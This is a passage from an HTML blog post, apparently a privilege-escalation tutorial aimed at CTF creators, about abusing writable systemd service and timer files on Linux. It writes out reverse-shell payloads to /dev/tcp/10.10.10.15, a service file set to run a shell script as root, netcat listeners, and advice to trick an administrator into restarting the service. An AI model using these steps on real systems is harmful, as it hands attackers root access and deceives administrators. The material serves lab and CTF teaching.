+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~/Desktop$ <span class="nb">echo</span> <span class="s1">&#39;bash -i &gt;&amp; /dev/tcp/10.10.10.15/1234 0&gt;&amp;1&#39;</span> &gt;&gt; /opt/elevate.sh
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>To make this work, we need to restart the service. However, if we are in a session with a user who lacks the necessary capabilities or permissions to restart the service, we have a few options: we can either reboot the system, wait for an opportunity, or persuade the system administrator to restart the service for us. Then we could receive the reverse shell:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nc -lvnp <span class="m">1234</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="privilege-escalation-via-writable-timer">Privilege Escalation via Writable Timer</h1>
+<p>A misconfiguration of this is when others have write permissions to the service configuration file:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo chmod o+w /etc/systemd/system/elevate.service
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We&rsquo;ll then verify the permissions to confirm that the <code>others</code> group is writable:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">ls -l /etc/systemd/system/elevate.service
+</span></span><span class="line"><span class="cl">-rwxr-xrwx <span class="m">1</span> root root <span class="m">96</span> Nov  <span class="m">5</span> 23:16 /etc/systemd/system/elevate.service
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We&rsquo;ll create a simple payload:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="nb">echo</span> -e <span class="s1">&#39;#!/bin/bash\n\nbash -i &gt;&amp; /dev/tcp/10.10.10.15/1234 0&gt;&amp;1&#39;</span> &gt;&gt; /home/user/evil.sh
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Then we could edit the service configuration file:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~/Desktop$ vim /etc/systemd/system/elevate.service
+</span></span><span class="line"><span class="cl"><span class="o">[</span>Unit<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="nv">Description</span><span class="o">=</span>Elevate Script
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>Service<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="nv">Type</span><span class="o">=</span>simple
+</span></span><span class="line"><span class="cl"><span class="nv">ExecStart</span><span class="o">=</span>/home/user/evil.sh
+</span></span><span class="line"><span class="cl"><span class="nv">User</span><span class="o">=</span>root
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Afterwards, we&rsquo;ll need to reload the daemon to apply the changes, in the case of the adversary being a user privileged who doesn&rsquo;t have capabilities or permissions to reset the daemon, then we must wait or trick the administrator into reloading the daemon, alternatively, we may be able to reboot the system:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo systemctl daemon-reload
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The timer can be monitored with the following command:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">watch -n <span class="m">1</span> sudo systemctl status elevate.timer
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Then we may receive the reverse shell:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nc -lvnp <span class="m">1234</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2021-12-28</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/privilege-escalation/">Privilege Escalation</a>,&nbsp;<a href="/tags/timers/">Timers</a>,&nbsp;<a href="/tags/systemd.timers/">Systemd.timers</a>,&nbsp;<a href="/tags/writable-timers/">Writable Timers</a>,&nbsp;<a href="/tags/writable-executables/">Writable Executables</a>,&nbsp;<a href="/tags/defend/">Defend</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/linux-privesc-capabilities/" class="prev" rel="prev" title="Linux Privilege Escalation - Capabilities  for CTF Creators"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Linux Privilege Escalation - Capabilities  for CTF Creators</a>
+            <a href="/linux-privesc-suid-segid/" class="next" rel="next" title="Linux Privilege Escalation - SUID/SGID for CTF Creators">Linux Privilege Escalation - SUID/SGID for CTF Creators<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.138.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2021 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="/lib/katex/katex.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":-1},"comment":{},"lightgallery":true,"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
